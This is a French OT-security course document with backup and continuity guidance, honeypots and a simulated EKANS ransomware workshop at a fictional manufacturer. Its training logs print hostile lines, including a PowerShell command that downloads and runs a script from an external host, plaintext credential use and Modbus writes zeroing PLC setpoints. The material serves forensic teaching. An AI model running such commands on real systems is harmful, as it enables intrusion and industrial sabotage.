**Métriques de suivi post-incident :**

| Métrique | Définition | Objectif cible |
|---|---|---|
| **MTTD** (Mean Time To Detect) | Durée entre l'intrusion initiale et sa détection | < 24h pour P1, < 4h idéalement |
| **MTTC** (Mean Time To Contain) | Durée entre la détection et le confinement | < 4h pour P1 |
| **MTTR** (Mean Time To Recover) | Durée entre le confinement et la reprise normale | < 72h pour une PME industrielle |
| **RPO** (Recovery Point Objective) | Perte de données maximale acceptable | Dépend des sauvegardes : 1h si sauvegarde horaire |
| **RTO** (Recovery Time Objective) | Durée maximale acceptable d'indisponibilité | À définir en fonction du coût/heure d'arrêt |

> **Exemple MecaProd :** MTTD = 25 minutes (06:22 → 06:47), MTTC = 53 minutes (06:22 → 07:15), MTTR = 72 heures. Coût de l'arrêt : ~16 667 €/heure × 72h = **1,2 M€**. Un investissement de 50 000 € en segmentation réseau + MFA aurait eu un ROI de 24× sur cet incident seul.

---

#### Sauvegardes OT — stratégie et bonnes pratiques

Les sauvegardes OT sont spécifiques et souvent négligées. Contrairement aux sauvegardes IT (fichiers, bases de données), les sauvegardes OT concernent des **éléments de configuration et de programme** qui ne changent presque jamais mais dont la perte peut être catastrophique.

**Ce qu'il faut sauvegarder en OT :**

| Élément | Contenu | Fréquence recommandée | Outil |
|---|---|---|---|
| **Programmes PLC** | Code ladder/FBD, blocs de données, configurations matérielle | À chaque modification + mensuelle | TIA Portal, EcoStruxure, Studio 5000 |
| **Configurations HMI** | Écrans SCADA, synoptiques, tags | À chaque modification | WinCC, InTouch, Ignition |
| **Configurations firewall OT** | Règles, politiques, tables de routage | À chaque changement | Export natif firewall |
| **Certificats PKI** | Certificats CA, certificats équipements | À chaque renouvellement | Fichiers PEM/PFX |
| **Configurations réseau** | VLAN, ACL switchs, plans d'adressage | À chaque modification | Export SNMP/CLI |
| **Images système SCADA** | Image complète du disque du PC SCADA | Mensuelle | Acronis, Veeam, dd |
| **Configurations IDS OT** | Règles Nozomi/Claroty, baseline réseau | À chaque modification | Export natif |

**Règle 3-2-1 adaptée à l'OT :**
- **3** copies de chaque sauvegarde
- **2** supports différents (ex. : NAS + disque USB)
- **1** copie hors site ou hors ligne (**air-gapped**) — la copie hors ligne est la seule garantie contre le ransomware

```
  Sauvegarde PLC quotidienne
         │
    ┌────┴────────────────────────────────────────────┐
    │  Copie 1 : NAS OT (réseau isolé, accessible)    │
    │  Copie 2 : NAS IT (DMZ, accessible par jump)    │
    │  Copie 3 : Disque USB chiffré, coffre-fort      │ ← air-gapped
    └────────────────────────────────────────────────┘
```

**Processus de test des sauvegardes :**
Les sauvegardes non testées ne sont pas des sauvegardes — elles ne sont que des espoirs. Un test de restauration doit être planifié **au moins trimestriellement** sur un environnement de test représentatif (PLC de remplacement, VM SCADA).

```bash
# Vérification d'intégrité d'une sauvegarde de programme PLC
sha256sum backup_plc_ligne1_20250901.s7l > backup_plc_ligne1_20250901.sha256
# Lors de la restauration, vérifier :
sha256sum --check backup_plc_ligne1_20250901.sha256
# Si OK → sauvegarde intègre, non altérée
```

---

#### PCA/PRA en environnement OT

**PCA (Plan de Continuité d'Activité) :** ensemble des mesures permettant de maintenir un niveau minimal de production pendant et après un incident.

**PRA (Plan de Reprise d'Activité) :** procédures permettant de restaurer le fonctionnement normal après un incident.

**Spécificités OT du PCA/PRA :**

| Aspect | PCA/PRA IT classique | PCA/PRA OT industriel |
|---|---|---|
| Priorité | Systèmes les plus critiques pour le CA | Équipements de sécurité (SIS) d'abord, puis production critique |
| Mode dégradé | Serveur de secours, bascule automatique | Conduite manuelle des PLC par les opérateurs terrain |
| RTO typique | 4 à 24 heures | Variable : de 1h (reprogrammation PLC rapide) à plusieurs semaines (remplacement matériel) |
| Dépendances | Infrastructure IT (réseau, AD, DNS) | Pièces de rechange OT (PLC de secours, cartes I/O) |
| Tests | Exercices informatiques | Simulations avec les équipes terrain, drill HSE |

**Éléments d'un PRA OT :**

1. **Inventaire des équipements critiques** avec délais de remplacement et fournisseurs alternatifs
2. **Stock de pièces de rechange** (spare parts) : PLC identiques, cartes d'entrées/sorties, passerelles
3. **Procédures de conduite manuelle** documentées pour chaque ligne de production
4. **Annuaire des contacts constructeurs** pour les licences de re-programmation d'urgence
5. **Sauvegardes des programmes PLC** accessibles hors ligne avec procédures de restauration step-by-step
6. **Contrats de maintenance avec SLA** (temps d'intervention garanti pour les équipements critiques)
7. **Exercices annuels** de restauration complète d'un PLC depuis zéro

---

#### Honeypots OT — détection par leurres

Un **honeypot OT** est un équipement (ou service simulé) qui ressemble à un équipement industriel réel mais qui n'a aucun rôle légitime dans le processus. Toute interaction avec un honeypot est donc nécessairement suspecte.

**Types de honeypots OT :**

| Type | Description | Exemple |
|---|---|---|
| **Low interaction** | Simule uniquement la bannière de réponse du protocole | Script Python simulant un PLC Modbus sur port 502 |
| **Medium interaction** | Simule les réponses aux requêtes courantes (FC=43, FC=3) | Conpot (honeypot ICS open source) |
| **High interaction** | Véritable PLC ou HMI isolé, connecté à un réseau leurre | PLC Siemens S7 hors production dans un VLAN dédié |

**Conpot** — honeypot ICS open source :
```bash
# Installation et démarrage d'un honeypot Modbus/S7comm
pip install conpot
conpot --template default  # simule un automate Siemens S7-200

# Conpot répond sur :
# port 502  (Modbus/TCP)
# port 102  (S7comm)
# port 80   (serveur web d'administration simulé)
# port 21   (FTP de firmware simulé)
```

**Valeur d'un honeypot OT :**
- **Détection précoce** : un attaquant qui scanne le réseau OT touchera le honeypot avant les vrais PLC
- **Zéro faux positif** : toute alerte honeypot est un vrai incident (aucun équipement légitime ne devrait interagir avec lui)
- **Intelligence** : les commandes envoyées au honeypot révèlent les intentions et compétences de l'attaquant
- **Coût faible** : une VM Linux avec Conpot suffit pour détecter les scans OT

**Exemple de déploiement MecaProd :**
```
Réseau OT 192.168.50.0/24 (PLC réels : .110, .111, .112)
  → Ajout d'un honeypot sur 192.168.50.120 (simulant un PLC Schneider M340)
  → Toute connexion vers .120 → alerte SIEM immédiate (P2)
  → Révèle les scans Nmap et les tentatives d'accès Modbus non autorisées
```

---

## Atelier 3 — Simulation d'un incident ransomware industriel (scénario EKANS) {#atelier-3}

### Présentation du scénario

**Contexte fictif — MecaProd, Valenciennes, un lundi matin à 06h47 :**

Les opérateurs de la ligne de production n°1 constatent que les écrans HMI de supervision sont gelés. Les automates continuent de tourner (les process physiques sont stables pour l'instant), mais le logiciel SCADA WinCC ne répond plus. Le service informatique est alerté à 07h05 : les serveurs de fichiers IT sont chiffrés, et une note de rançon en anglais est affichée sur plusieurs postes. À 07h15, un technicien constate que le logiciel d'ingénierie PLC (TIA Portal) est également chiffré sur le PC d'ingénierie.

**Votre mission :** reconstituer l'attaque, confiner l'incident, analyser les preuves, rédiger le rapport d'incident et préparer la communication de crise.

### Rôles distribués

Chaque équipe (3 à 4 personnes) se répartit les rôles suivants :

| Rôle | Responsabilités dans l'atelier |
|---|---|
| **Analyste SOC / Technique** | Analyse des logs Windows et réseau, reconstitution de la Kill Chain, identification des IoC |
| **RSSI / Coordinateur** | Qualification de l'incident, décisions de confinement, interface avec la direction |
| **Responsable production / OT** | Évaluation de l'impact process, décisions d'arrêt/reprise OT, mode dégradé |
| **Communicant / Juridique** | Rédaction des communications de crise (opérateurs, direction, clients, CERT-FR) |

> **Note :** dans une équipe de 3, le rôle RSSI et Communicant peuvent être fusionnés.

---

### Matériaux fournis

**Fichier 1 — Extrait de logs Windows Security (Security.evtx) :**

```
[Lundi 06:47:12] EventID=4624 SubjectUserName=SYSTEM LogonType=3 IpAddress=192.168.10.45
  → Connexion réseau depuis 192.168.10.45 sur MECAPROD-SCADA01

[Lundi 06:47:18] EventID=4688 ProcessName=cmd.exe ParentProcess=services.exe
  CommandLine="cmd.exe /c net use \\192.168.10.50\C$ /user:admin P@ssw0rd2023"
  → Montage d'un partage réseau avec credentials en clair

[Lundi 06:47:21] EventID=4688 ProcessName=powershell.exe ParentProcess=cmd.exe
  CommandLine="powershell -ep bypass -c IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.x/p.ps1')"
  → Téléchargement et exécution d'un script PowerShell depuis un C2 externe

[Lundi 06:47:35] EventID=7045 ServiceName=WindowsDefenderUpdate ServiceType=WIN32_OWN_PROCESS
  ImagePath="C:\Windows\Temp\svch0st.exe"
  → Installation d'un faux service (persistence)

[Lundi 06:48:02] EventID=4688 ProcessName=svch0st.exe ParentProcess=services.exe
  CommandLine="svch0st.exe --kill-ot"
  → Exécution du payload EKANS — phase kill processes

[Lundi 06:48:14] EventID=4688 ProcessName=svch0st.exe
  CommandLine="svch0st.exe --encrypt C:\\ D:\\ \\192.168.10.50\C$"
  → Phase chiffrement

[Lundi 06:51:44] EventID=4719 AuditPolicyChange=RemoveAudit
  → Tentative de suppression des logs d'audit (détectée mais partielle)
```

**Fichier 2 — Extrait de logs firewall OT :**

```
[06:22:14] ALLOW TCP 10.0.10.87:54213 → 192.168.10.200:3389 [RDP - connexion VPN]
  ← Accès RDP depuis IP VPN (connexion légitime ?)

[06:22:31] ALLOW TCP 192.168.10.200:49234 → 192.168.10.0/24:502 [Modbus scan]
  ← Balayage Modbus depuis le poste SCADA (inhabituel)

[06:23:05] ALLOW TCP 192.168.10.200:51001 → 192.168.10.110:502 [Modbus FC=3]
[06:23:06] ALLOW TCP 192.168.10.200:51002 → 192.168.10.111:502 [Modbus FC=3]
[06:23:07] ALLOW TCP 192.168.10.200:51003 → 192.168.10.112:502 [Modbus FC=3]
  ← Lecture de tous les PLC en séquence rapide (scan de reconnaissance)

[06:46:58] ALLOW TCP 192.168.10.200:52100 → 192.168.10.110:502 [Modbus FC=6]
  REG=40001 VAL=0000 ← Écriture registre — remise à zéro d'une consigne
[06:46:59] ALLOW TCP 192.168.10.200:52101 → 192.168.10.111:502 [Modbus FC=6]
  REG=40001 VAL=0000
[06:47:00] ALLOW TCP 192.168.10.200:52102 → 192.168.10.112:502 [Modbus FC=6]
  REG=40001 VAL=0000 ← Tous les PLC remis à zéro avant le chiffrement

[06:47:01] DROP TCP 10.0.10.0/24:* → 192.168.10.0/24:* [POLICY BLOCK]
  ← Règle de blocage IT→OT activée (trop tard)
```

**Fichier 3 — Extrait de logs IDS OT (Nozomi) :**

```
[06:22:33] ALERT Medium | New source IP | 192.168.10.200 scanning 192.168.10.0/24 port 502
[06:22:58] ALERT High   | Unusual Modbus activity | 192.168.10.200 | 45 req/5s (baseline: 1 req/s)
[06:46:58] ALERT Critical | Modbus Write (FC=6) from unauthorized source | 192.168.10.200
           | Target: 192.168.10.110, Register: 40001, Value: 0
[06:46:59] ALERT Critical | Modbus Write (FC=6) | 192.168.10.111, Register: 40001, Value: 0
[06:47:00] ALERT Critical | Modbus Write (FC=6) | 192.168.10.112, Register: 40001, Value: 0
[06:48:14] INFO  | Communication lost | 192.168.10.200 (SCADA) no longer responding
```

---

### Phase 1 — Analyse forensique et reconstitution de la Kill Chain (45 min)

**Objectif :** à partir des trois fichiers de logs, reconstituer précisément le déroulement de l'attaque.

**Exercice 1.1 — Timeline d'attaque :**

Remplir la timeline suivante à partir des logs :

| Heure | Source | Action détectée | Log source | Étape Kill Chain |
|---|---|---|---|---|
| 06:22:14 | ? | ? | Firewall | ? |
| 06:22:31 | ? | ? | Firewall | ? |
| 06:47:12 | ? | ? | Windows | ? |
| 06:47:18 | ? | ? | Windows | ? |
| 06:47:21 | ? | ? | Windows | ? |
| 06:47:35 | ? | ? | Windows | ? |
| 06:48:02 | ? | ? | Windows | ? |
| 06:48:14 | ? | ? | Windows + IDS | ? |

**Exercice 1.2 — Identification des IoC :**

Extraire de l'ensemble des logs :
- Adresses IP malveillantes ou suspectes
- Noms de processus malveillants
- URL/domaine du serveur C2
- Hashes (si présents)
- Noms de services/fichiers créés

**Exercice 1.3 — Vecteur d'entrée initial :**

À partir des logs disponibles, identifier :
1. Par quel moyen l'attaquant a-t-il obtenu son accès initial ?
2. Quelle mesure de sécurité aurait empêché cet accès initial ?
3. À quel moment le firewall OT aurait-il dû bloquer l'activité suspecte ?

---

### Phase 2 — Stratégie de confinement OT (30 min)

**Contexte :** il est 07h15. Le ransomware est actif sur MECAPROD-SCADA01. Les PLC tournent encore (leurs programmes ne sont pas chiffrés), mais leurs registres de consigne ont été remis à zéro. Les lignes de production fonctionnent en mode dégradé.

**Exercice 2.1 — Décisions de confinement immédiates :**

En tant que RSSI et Responsable Production, répondre aux questions suivantes :

1. **Doit-on couper immédiatement MECAPROD-SCADA01 ?** Justifier en tenant compte des risques OT.
2. **Peut-on isoler uniquement le VLAN SCADA (192.168.10.0/24) du VLAN IT (10.0.10.0/24) ?** Quel impact sur les opérations ?
3. **Les PLC (192.168.10.110-112) sont-ils compromis ?** Comment le vérifier sans perturber le process ?
4. **Faut-il remettre à la main les consignes des PLC (registre 40001) ?** Quelle valeur ? Quelle procédure ?

**Exercice 2.2 — Plan de confinement en 5 actions prioritaires :**

Rédiger un plan de confinement immédiat avec 5 actions prioritaires, chacune avec :
- Action précise
- Responsable
- Risque OT associé
- Mitigation du risque

---

### Phase 3 — Rédaction du rapport d'incident (30 min)

**Structure du rapport d'incident (2 pages maximum) :**

```
RAPPORT D'INCIDENT DE SÉCURITÉ
MecaProd — Incident ransomware EKANS
Date : [date de l'atelier]
Classification : CONFIDENTIEL

1. RÉSUMÉ EXÉCUTIF (5 lignes max)
   → Pour la direction générale, non technique

2. CHRONOLOGIE DE L'INCIDENT
   → Timeline avec heures, actions, sources de logs

3. ANALYSE TECHNIQUE
   → Kill Chain reconstituée
   → Systèmes impactés (IT et OT)
   → Indicateurs de compromission (IoC)

4. IMPACT
   → Impact IT (systèmes chiffrés, données)
   → Impact OT (systèmes impactés, arrêt de production)
   → Impact financier estimé (coût/heure d'arrêt × durée)

5. ACTIONS DE CONFINEMENT PRISES
   → Actions réalisées + responsables

6. RECOMMANDATIONS IMMÉDIATES
   → 3 mesures à implémenter dans les 72h
```

---

### Phase 4 — Communications de crise (15 min)

**Exercice 4 :** rédiger deux des communications suivantes (au choix de l'équipe) :

**Option A — Communication opérateurs de production :**
Message flash destiné aux opérateurs en salle de contrôle. Ton : direct, rassurant, instructions claires. Format : SMS / message oral. Max : 5 phrases.

**Option B — Communication direction générale :**
Note de synthèse pour le DG et le DAF. Ton : factuel, synthétique, décisionnel. Format : note écrite. Max : 15 lignes.

**Option C — Déclaration CERT-FR :**
Formulaire de notification d'incident au CERT-FR (https://www.cert.ssi.gouv.fr/contact/). Contenu : nature de l'incident, systèmes impactés, date de détection, mesures prises.

---

### Grille d'évaluation de l'Atelier 3 (/20 points)

| Critère | Points | Indicateurs de niveau Excellent |
|---|---|---|
| **Timeline d'attaque** | 4 pts | Toutes les étapes horodatées, source de log précisée pour chaque événement, étape Kill Chain correctement identifiée |
| **IoC identifiés** | 3 pts | IP malveillante (185.220.101.x), processus malveillants (svch0st.exe), service persistant (WindowsDefenderUpdate), URL C2, hash si mentionné |
| **Plan de confinement** | 5 pts | 5 actions priorisées, risque OT de chaque action évalué, responsable désigné, logique d'isolation réseau vs extinction expliquée |
| **Rapport d'incident** | 5 pts | Structure respectée (résumé exécutif non technique, chronologie précise, IoC listés, impacts IT/OT distingués, recommandations réalistes) |
| **Communication de crise** | 3 pts | Ton adapté à l'audience (non technique pour opérateurs/DG), informations vérifiées, pas de détails techniques sensibles dans la communication externe |

**Éléments différenciants pour un excellent :**
- Identification que la règle firewall IT→OT s'est déclenchée **après** les écritures Modbus (trop tard) → recommandation de DPI Modbus plutôt que blocage IP
- Proposition d'un honeypot OT pour détecter le scan Modbus plus tôt (06:22:33)
- Calcul du MTTD (25 min) et du coût horaire d'arrêt pour chiffrer l'impact financier
- Mention de la corrélation SIEM : les alertes IDS de 06:22:33 auraient dû déclencher une règle SIEM → escalade automatique

---

### Debriefing collectif (15 min)

**Points de discussion :**

**1. Quelle mesure aurait eu le plus grand impact ?**
Réponse attendue : **le MFA sur le VPN/RDP**. L'accès initial (06:22:14) est le seul point de blocage possible avant toute la séquence. Avec MFA, des credentials compromis ne suffisent pas. Coût estimé : < 5 000 €/an pour une PME.

**2. Le firewall a bloqué à 06:47:01 — mais trop tard. Pourquoi ?**
La règle firewall était un blocage IP global (deny IT→OT). Elle n'interprète pas le contenu Modbus. Les écritures FC=06 sur les PLC (06:46:58–07:00) sont passées **pendant** que la règle de blocage n'était pas encore activée — probablement déclenchée manuellement par un opérateur, trop lentement. **Leçon :** une règle de DPI Modbus (bloquer FC≥5 depuis toute source non autorisée) sur le firewall OT aurait bloqué les écritures automatiquement, sans intervention humaine, dès la première tentative.

**3. Les alertes IDS à 06:22:33 n'ont pas été traitées. Pourquoi ?**
Raisons typiques :
- Pas de SOC dédié dans une PME industrielle (les alertes arrivent dans une boîte mail peu surveillée)
- Trop d'alertes de faible criticité génèrent une "alerte fatigue" — les opérateurs les ignorent
- L'alerte "Medium" du scan Modbus à 06:22:33 semble peu urgente — personne ne la connecte à la connexion RDP de 06:22:14

**Solution :** règle de corrélation SIEM : connexion RDP non habituelle (06:22:14) **ET** scan Modbus dans les 60 secondes (06:22:33) → escalade automatique en P2, notification téléphonique immédiate.

**4. Comment détecter l'intrusion initiale (06:22:14) plus tôt ?**
Plusieurs indicateurs précurseurs auraient pu alerter :
- L'adresse IP source (10.0.10.87) était-elle une IP VPN habituelle pour cet utilisateur ? Un système de détection d'anomalie géographique ou comportementale (UEBA) aurait pu alerter.
- Les credentials utilisés avaient-ils été identifiés comme compromis dans des bases HaveIBeenPwned ? Un abonnement à un service de veille credential compromise (Microsoft Entra ID Protection, SpyCloud) aurait pu bloquer proactivement ces credentials.
- Heure de connexion : 06:22 est-elle habituelle pour cet utilisateur ? Une règle de MFA step-up en dehors des heures ouvrables aurait demandé une confirmation supplémentaire.

**Message de clôture pour le formateur :**
> Cet atelier illustre que la chaîne d'attaque EKANS n'a rien de sophistiqué : des credentials compromis sur RDP, un réseau plat, des protocoles sans authentification. Chaque étape était prévisible et évitable. La question n'est pas "si" une PME industrielle sera attaquée, mais "quand" et "combien de couches de défense auront été mises en place avant".

---

## Briefing TP MecaProd — préparation du Jour 5 {#briefing-mecaprod}

### Présentation du TP de synthèse

Le **TP MecaProd** (Jour 5) est l'évaluation finale du module (CC2). Il intègre l'ensemble des notions vues lors des 4 premiers jours et demande à chaque équipe de produire un **dossier de sécurisation complet** pour la PME MecaProd, suivi d'une **restitution orale** (EFM).

### Contexte complet MecaProd

**Présentation de l'entreprise :**
- PME de mécanique de précision, Valenciennes (59)
- 85 salariés, CA 12 M€/an
- 2 lignes de production CNC (fraiseuses, tours), 1 ligne de contrôle qualité automatisée
- Clients : secteurs automobile et aéronautique (exigences qualité strictes)

**Architecture informatique avant l'attaque :**
- Réseau plat IT/OT (pas de segmentation)
- 3 PLC Schneider M340 (Modbus/TCP, port 502, firmware V2.60 — CVE-2018-7789)
- 1 PC SCADA Windows 10 non patchné, WinCC installé, RDP ouvert sur port 3389
- 1 historien de données OSIsoft PI connecté au réseau IT et OT
- 12 capteurs IIoT (température, vibration) connectés en MQTT port 1883 (non sécurisé)
- Accès VPN pour la maintenance Schneider Electric (credentials partagés, pas de MFA)
- Sauvegardes des programmes PLC : dernière sauvegarde datant de 3 mois

**L'attaque EKANS :**
- Vecteur initial : RDP exposé sur Internet, credentials compromis (trouvés sur le dark web)
- Propagation : réseau plat → accès direct aux PLC et SCADA
- Impact IT : 80 % des serveurs chiffrés, fichiers de production inaccessibles
- Impact OT : SCADA HS, supervision perdue pendant 72 heures, production arrêtée
- Rançon demandée : 450 000 € en Bitcoin (non payée)
- **Coût total estimé : 1,2 M€** (perte de production + reprise + consultants IR + communication)

### Structure du TP (3h30)

| Phase | Durée | Contenu | Livrable |
|---|---|---|---|
| **P1 — Kill Chain & impacts** | 45 min | Reconstituer l'attaque EKANS sur MecaProd, identifier les vulnérabilités exploitées, quantifier les impacts financiers et OT | Tableau Kill Chain + matrice d'impacts |
| **P2 — Matrice de risques** | 40 min | Construire une matrice de risques OT (minimum 8 risques), évaluer probabilité × impact, prioriser | Matrice de risques hiérarchisée |
| **P3 — Architecture cible** | 60 min | Concevoir une architecture sécurisée en 5 zones IEC 62443 avec schéma annoté, flux autorisés | Schéma d'architecture sécurisée |
| **P4 — Défense en profondeur** | 50 min | Définir les correctifs V1 à V9, les mesures de supervision, la PKI, les règles firewall | Plan de mesures de sécurité |
| **P5 — Plan d'action** | 15 min | Prioriser en 3 phases (quick wins, moyen terme, long terme), chiffrer les 3 quick wins | Feuille de route chiffrée |

### Critères d'évaluation EFM (/25 points)

| Critère | Points | Indicateurs de niveau Excellent |
|---|---|---|
| **Analyse de l'attaque** | 5 pts | Kill Chain complète, vulnérabilités précisément identifiées (CVE), impacts financiers chiffrés |
| **Matrice de risques** | 5 pts | ≥ 8 risques, probabilité et impact justifiés, priorisation cohérente avec le contexte MecaProd |
| **Architecture sécurisée** | 5 pts | 5 zones IEC 62443 clairement définies, DMZ industrielle, flux annotés, SL cible indiqué par zone |
| **Mesures de sécurité** | 5 pts | Correctifs V1-V9 réalistes et précis, supervision OT, PKI, règles firewall DPI Modbus |
| **Restitution orale** | 5 pts | Clarté, maîtrise technique, réponses aux questions, respect du temps (15 min/équipe) |

**Points bonus :**
- Référence à MITRE ATT&CK for ICS avec techniques précises (T0836, T0846...)
- Proposition d'une Data Diode avec justification
- Calcul de ROI sur les quick wins (coût mesure vs coût incident évité)
- Référence aux exigences IEC 62443-3-3 FR par FR

---

### Guide d'aide à la préparation — Phase 3 : Architecture cible

L'architecture cible doit comporter **5 zones distinctes** conformes IEC 62443. Le schéma ci-dessous est une base de travail à adapter et annoter :

```
┌──────────────────────────────────────────────────────────────────────────────┐
│  ZONE 5 — Entreprise / IT  (SL-1)                                            │
│  10.0.10.0/24 — ERP (SAP), AD, messagerie, postes bureautiques              │
│  Mesures : EDR, patches automatiques, MFA sur accès internes                │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                              Firewall 1 (IT↔DMZ)
                              Règles : HTTPS, SQL vers historien, RDP vers Jump
                                    │
┌───────────────────────────────────┴─────────────────────────────────────────┐
│  ZONE 4 — DMZ Industrielle  (SL-2)                                           │
│  10.0.30.0/24 — Historien OSIsoft PI, Jump server, serveur WSUS OT          │
│  Mesures : Jump server avec enregistrement sessions + MFA, HTTPS only       │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                              Firewall 2 OT (DMZ↔Supervision)
                              DPI : autoriser seulement port 502 vers N2
                              Bloquer : FC≥5 depuis tout autre que SCADA
                                    │
┌───────────────────────────────────┴─────────────────────────────────────────┐
│  ZONE 3 — Supervision  (SL-2)                                                │
│  192.168.40.0/24 — SCADA WinCC (Windows 10 patchné), HMI, MES               │
│  Mesures : Application allowlisting, antivirus compatible, comptes nominatifs│
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │
                              Firewall 3 OT applicatif (Supervision↔Contrôle)
                              DPI Modbus strict : source SCADA uniquement
                                    │
┌───────────────────────────────────┴─────────────────────────────────────────┐
│  ZONE 2 — Contrôle  (SL-2)                                                   │
│  192.168.50.0/24 — PLC Schneider M340 (.110, .111, .112)                    │
│  Mesures : Patch CVE-2018-7789, accès ingénierie depuis Jump uniquement      │
└───────────────────────────────────┬─────────────────────────────────────────┘
                                    │ (accès physique sécurisé uniquement)
┌───────────────────────────────────┴─────────────────────────────────────────┐
│  ZONE 1 — Terrain / IIoT  (SL-1)                                             │
│  192.168.70.0/24 — 12 capteurs MQTT (→ broker port 8883 avec mTLS)          │
│  Mesures : broker Mosquitto mTLS, VLAN dédié, PKI industrielle               │
└──────────────────────────────────────────────────────────────────────────────┘

  Sonde IDS OT (Nozomi/Zeek) — port SPAN sur tous les switchs OT
  SIEM (Microsoft Sentinel) — collecte logs Windows + firewall + IDS OT
```

---

### Guide d'aide à la préparation — Phase 4 : Correctifs V1 à V9

Les correctifs V1 à V9 sont les mesures techniques et organisationnelles concrètes à proposer pour MecaProd. Voici le cadre de travail — les apprenants doivent compléter et justifier chaque correctif :

| Correctif | Catégorie | Intitulé | Détails attendus | IEC 62443 FR |
|---|---|---|---|---|
| **V1** | Authentification | MFA sur tous les accès distants | Quel outil (Duo, Entra MFA) ? Portée (VPN, RDP, Jump) ? Délai de déploiement ? | FR1 |
| **V2** | Segmentation | DMZ industrielle à deux firewalls | Quels firewalls ? Règles minimales ? Impact sur la supervision ? | FR5 |
| **V3** | Patch management | Correction CVE-2018-7789 (Schneider M340) | Procédure de patch OT, fenêtre de maintenance, validation constructeur | FR3 |
| **V4** | Chiffrement MQTT | Migration port 1883 → 8883 mTLS | PKI à déployer, nombre de certificats, certificats clients par capteur | FR4 |
| **V5** | Contrôle d'accès | Suppression des accès RDP directs | Remplacement par Jump server, désactivation RDP sur SCADA, liste blanche IP | FR1/FR2 |
| **V6** | Supervision | Déploiement IDS OT passif | Solution choisie (Nozomi/Zeek), placement port SPAN, périmètre de surveillance | FR6 |
| **V7** | SIEM | Centralisation et corrélation des logs | Sources de logs (Windows, firewall, IDS), règles de corrélation prioritaires | FR6 |
| **V8** | Sauvegarde | Plan de sauvegarde OT air-gapped | Éléments sauvegardés (PLC, SCADA, firewalls), fréquence, procédure de restauration testée | FR7 |
| **V9** | Réponse aux incidents | Plan de réponse aux incidents OT | Qui fait quoi, contacts CERT-FR, procédures de confinement OT documentées | FR6 |

**Exemple de correctif V1 bien rédigé :**
> *V1 — MFA sur les accès distants :* Déployer Microsoft Entra MFA (intégré à l'AD existant) sur tous les accès VPN (FortiGate) et sur le Jump server (Wallix Bastion). Les techniciens Schneider Electric utiliseront des comptes temporaires à durée de vie limitée (24h). Délai de déploiement : 2 semaines. Coût : 3 600 €/an (30 licences). Correspond à IEC 62443-3-3 SR 1.1 (Human User Identification and Authentication). Bloque directement le vecteur d'entrée de l'attaque EKANS.

**Exemple de correctif V1 insuffisant :**
> *V1 — Mettre en place une authentification forte.* ← trop vague, pas actionnable, pas chiffré, pas lié à l'IEC 62443.

---

## Synthèse du Jour 4

### Points clés à retenir

1. **La défense en profondeur suppose que chaque couche sera franchie** : l'objectif n'est pas d'être imprenable, mais de rendre l'attaque assez longue et coûteuse pour être détectée avant l'impact final.

2. **La segmentation réseau est la mesure n°1** : un réseau plat IT/OT transforme n'importe quelle compromission IT en accès direct aux PLC. La DMZ industrielle à deux firewalls est la référence IEC 62443.

3. **L'IDS OT doit être passif** : une sonde active peut crasher des PLC à faible CPU. La surveillance via port SPAN, sans émission de paquets, est la seule méthode compatible avec la disponibilité du processus.

4. **Le SIEM permet la détection multi-sources** : une attaque OT passe systématiquement par plusieurs systèmes (VPN, Windows, firewall, IDS). Seule la corrélation automatisée permet de détecter la séquence complète en temps réel.

5. **Le confinement OT ne se fait pas comme en IT** : éteindre un PLC sans procédure peut provoquer un accident. Le confinement commence par l'isolation réseau logique, pas par l'extinction des équipements.

6. **La communication de crise se prépare avant l'incident** : les templates, les contacts, les niveaux d'escalade doivent être prêts. Improviser une communication de crise en plein incident est une garantie d'erreurs.

### Passerelle vers le Jour 5

Le **Jour 5** est entièrement consacré au **TP MecaProd** (3h30 de travail en équipe) suivi des **présentations orales EFM** (3h). Toutes les notions des Jours 1 à 4 sont mobilisées. Revoir en particulier :

- La Kill Chain industrielle (Jour 1) — pour la Phase 1 du TP
- Les CVE OT et la matrice de risques (Jour 2) — pour la Phase 2
- Les zones IEC 62443 et mTLS (Jour 3) — pour la Phase 3
- La DMZ industrielle, l'IDS OT et la réponse aux incidents (Jour 4) — pour les Phases 4 et 5

---

## Ressources complémentaires

### Réponse aux incidents OT
- **NIST SP 800-61 Rev.2** — Computer Security Incident Handling Guide : https://doi.org/10.6028/NIST.SP.800-61r2
- **CISA — Responding to ICS Cyberincidents** : https://www.cisa.gov/sites/default/files/publications/CISA_Cybersecurity_Incident_Response_Guidance.pdf
- **CERT-FR — Déclaration d'incident** : https://www.cert.ssi.gouv.fr/contact/
- **FIRST — CSIRT Services Framework** : https://www.first.org/standards/frameworks/csirts/

### Segmentation et firewalls OT
- **ANSSI — Recommandations pour la protection des systèmes industriels** : https://www.ssi.gouv.fr
- **Claroty — OT Network Segmentation Guide** (livre blanc disponible sur claroty.com)
- **Nozomi Networks — ICS/OT Security Best Practices** (disponible sur nozominetworks.com)

### Threat Intelligence OT
- **MITRE ATT&CK for ICS** : https://attack.mitre.org/matrices/ics/
- **Dragos Year in Review** (rapport annuel sur les menaces OT) : https://www.dragos.com
- **Kaspersky ICS CERT** (alertes et rapports) : https://ics-cert.kaspersky.com

### Outils forensiques
- **Volatility** (analyse mémoire) : https://www.volatilityfoundation.org
- **Autopsy / The Sleuth Kit** (analyse disque) : https://www.autopsy.com
- **KAPE** (Kroll Artifact Parser and Extractor) — collecte forensique Windows : https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape
- **MISP** (Malware Information Sharing Platform) — partage d'IoC : https://www.misp-project.org

---

*Document pédagogique SEC500 — Jour 4 · JUNIA XP 2025/2026 · Formateur : Christophe CROISANT*
*Version 1.0 — à compléter selon retours terrain lors de l'animation*
